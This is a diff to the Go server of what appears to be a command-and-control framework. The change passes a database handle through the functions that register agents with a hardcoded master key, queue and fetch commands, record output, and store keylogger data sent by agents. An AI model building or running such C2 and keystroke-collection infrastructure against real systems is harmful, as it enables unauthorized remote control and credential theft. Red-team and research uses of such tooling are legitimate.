@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"crypto/tls"
+	"database/sql"
 	"encoding/gob"
 	"log"
 	"net"
@@ -35,7 +36,7 @@ func IsValidUUID(u string) bool {
 	return err == nil
 }
 
-func handleconn(connection net.Conn) {
+func handleconn(db *sql.DB, connection net.Conn) {
 	for {
 
 		text, _ := bufio.NewReader(connection).ReadString('\n')
@@ -59,13 +60,13 @@ func handleconn(connection net.Conn) {
 				if IsValidUUID(uid) {
 
 					// search uuid in database using received uuid
-					fetch := data.FetchOneAgent(uid)                  // first pass agent check
+					fetch := data.FetchOneAgent(db, uid)                  // first pass agent check
 					if fetch.Uuid == "" && masterkey == "MASTERKEY" { //prob check its a uuid and master key                // future fix (accepts all uuid) reason: to allow server create agent record in db
 						//parse IP, hostname and user from agent
-						data.CreateAgent(uid, AgentServerIP+":"+AgentServerPort, AgentFreq, AgentJitter, ip, user, hostname) // default values (callback set by user)
-						data.CreateKeys(uid)
+						data.CreateAgent(db, uid, AgentServerIP+":"+AgentServerPort, AgentFreq, AgentJitter, ip, user, hostname) // default values (callback set by user)
+						data.CreateKeys(db, uid)
 					}
-					fetch = data.FetchOneAgent(uid) // second pass agent check
+					fetch = data.FetchOneAgent(db, uid) // second pass agent check
 
 					logger.Logf(logger.Info, "Agent %s Fetched for validation\n", fetch.Uuid)
 					if uid == fetch.Uuid {
@@ -74,7 +75,7 @@ func handleconn(connection net.Conn) {
 
 							logger.Logf(logger.Info, "Agent %s Connected\n", uid)
 							encoder := gob.NewEncoder(connection)
-							instruct := data.FetchNextCommand(fetch.Uuid)
+							instruct := data.FetchNextCommand(db, fetch.Uuid)
 							logger.Logf(logger.Info, "Fetched %s \n", instruct.CommandType)
 							if err := encoder.Encode(instruct); err != nil {
 								log.Fatalln(err)
@@ -88,7 +89,7 @@ func handleconn(connection net.Conn) {
 								connection.Close()
 							} else {
 								logger.Logf(logger.Debug, "Agent %s Sent Back: %s\n", uid, destruct.Output)
-								data.UpdateAgentCommand(destruct.CommandUUID, destruct.Output, fetch.Uuid)
+								data.UpdateAgentCommand(db, destruct.CommandUUID, destruct.Output, fetch.Uuid)
 								if destruct.Output == "~Killed~" {
 									logger.Logf(logger.Warning, "Agent %s Killed\n", uid)
 									connection.Close()
@@ -96,7 +97,7 @@ func handleconn(connection net.Conn) {
 								connection.Close()
 							}
 							now := time.Now()
-							data.UpdateAgentCheckIn(uid, now.Unix())
+							data.UpdateAgentCheckIn(db, uid, now.Unix())
 						} else if keyOrNot == "KeysBeacon" { // Handle keylog response
 
 							logger.Logf(logger.Info, "Agent %s Keys Beacon Connected\n", uid)
@@ -112,14 +113,14 @@ func handleconn(connection net.Conn) {
 
 							if destruct.Keys != "" {
 								logger.Logf(logger.Debug, "Agent %s with keys: %s\n", uid, destruct.Keys)
-								data.UpdateAgentKeys(uid, destruct.Keys)
+								data.UpdateAgentKeys(db, uid, destruct.Keys)
 								connection.Close()
 							} else {
 								logger.Logf(logger.Debug, "Agent %s Sent Back No Keys\n", uid)
 								connection.Close()
 							}
 							now := time.Now()
-							data.UpdateAgentCheckIn(uid, now.Unix())
+							data.UpdateAgentCheckIn(db, uid, now.Unix())
 						} else {
 							logger.Logf(logger.Info, "Unknown Beacon Type\n")
 							connection.Close()
@@ -146,8 +147,9 @@ func main() {
 	c2serverip := goDotEnvVariable("C2SERVER_IP")
 	c2serverport := goDotEnvVariable("C2SERVER_PORT")
 
-	data.OpenDatabase()
-	data.InitDatabase()
+	db := data.OpenDatabase()
+	defer db.Close()
+	data.InitDatabase(db)
 	// _, error := os.Stat("./data/sqlite-database.db")
 	// if os.IsNotExist(error) {
 	// 	data.InitDatabase()
@@ -168,14 +170,14 @@ func main() {
 	for {
 		select {
 		case <-ticker:
-			go data.UpdateAgentStatus()
+			go data.UpdateAgentStatus(db)
 		default:
 			connection, err := listener.Accept()
 			if err != nil {
 				log.
 					Fatalln(err)
 			}
-			go handleconn(connection)
+			go handleconn(db, connection)
 		}
 
 	}
